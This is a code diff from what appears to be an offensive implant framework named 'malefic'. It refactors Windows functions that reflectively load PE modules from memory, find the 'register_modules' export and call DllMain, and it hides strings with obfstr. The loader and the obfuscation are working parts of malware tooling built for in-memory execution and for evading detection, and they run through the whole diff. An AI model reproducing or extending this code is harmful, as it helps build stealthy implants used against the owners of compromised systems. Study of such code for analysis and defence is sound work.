@@ -10,7 +10,7 @@ use crate::{
 #[cfg(target_os = "windows")]
 #[cfg(feature = "prebuild")]
 pub unsafe fn get_function_address(module_base: *const c_void, function_name: &str) -> *const c_void {
-    use crate::win::kit::MaleficGetFuncAddrWithModuleBaseDefault;
+    use crate::win::kit::bindings::MaleficGetFuncAddrWithModuleBaseDefault;
 
     MaleficGetFuncAddrWithModuleBaseDefault(
         module_base,
@@ -29,7 +29,8 @@ pub unsafe fn get_function_address(module_base: *const c_void, function_name: &s
 #[cfg(target_os = "windows")]
 #[cfg(feature = "prebuild")]
 pub unsafe fn load_module(bins: Vec<u8>, bundle: String) -> Result<*const c_void, CommonError> {
-    use crate::win::kit::{PELoader, MaleficModule};
+    use crate::win::kit::bindings::PELoader;
+    use crate::win::kit::MaleficModule;
 
     if bins.is_empty() || bundle.is_empty() {
         return Err(ArgsError(obfstr!("bins or bundle is empty :)").to_string()));
@@ -70,7 +71,7 @@ pub unsafe fn load_module(
 ) -> Result<*const malefic_win_kit::pe::PELoader::MaleficModule, CommonError> {
     use malefic_win_kit::pe::PELoader::malefic_loader;
 
-    use crate::{common::utils::pointer_add, win::types::DllMain};
+    use crate::{win::types::DllMain};
 
     if bins.is_empty() || bundle.is_empty() {
         return Err(ArgsError(obfstr!("bins or bundle is empty :)").to_string()));
@@ -87,6 +88,7 @@ pub unsafe fn load_module(
     if dark_module.is_null() || (*dark_module).entry_point.is_null() {
         return Err(ArgsError("dark module load failed!".to_string()));
     }
+    debug!("[+] dark module loaded at {:x}, entry point: {:x}", (*dark_module).entry_point as usize, dark_module as usize);
     let _ = core::mem::transmute::<usize, DllMain>((*dark_module).entry_point as usize)(
         dark_module as _,
         1, // DLL_PROCESS_ATTACH
@@ -98,7 +100,7 @@ pub unsafe fn load_module(
 #[cfg(target_os = "windows")]
 #[cfg(feature = "prebuild")]
 pub unsafe fn unload_pe(module: *const c_void) {
-    use crate::win::kit::UnloadPE;
+    use crate::win::kit::bindings::UnloadPE;
 
     if module.is_null() {
         return;
@@ -121,27 +123,25 @@ pub unsafe fn unload_pe(
 
 
 #[cfg(target_os = "windows")]
-#[cfg(feature = "prebuild")]
 pub unsafe fn call_fresh_modules(module: *const c_void) -> Option<*const c_void> {
-    use crate::win::kit::DarkModule;
-    let module: *const DarkModule = module as _;
+    #[cfg(feature = "prebuild")]
+    use crate::win::kit::MaleficModule;
+    #[cfg(feature = "source")]
+    use malefic_win_kit::pe::PELoader::MaleficModule;
+    let module: *const MaleficModule = module as _;
     if module.is_null() {
         return None;
     }
-
-    Some(get_function_address((*module).module_base, "register_modules"))
-}
-
-#[cfg(target_os = "windows")]
-#[cfg(feature = "source")]
-pub unsafe fn call_fresh_modules(
-    module: *const malefic_win_kit::pe::PELoader::MaleficModule,
-) -> Option<*const c_void> {
-    if module.is_null() {
+    if (*module).export_func.is_empty() {
         return None;
     }
+    for i in (*module).export_func.iter() {
+        if i.0 == obfstr!("register_modules") {
+            return Some(i.1 as *const c_void);
+        }
+    }
+    None
 
-    Some(get_function_address((*module).new_module, "register_modules"))
 }
 
 #[cfg(target_family = "unix")]
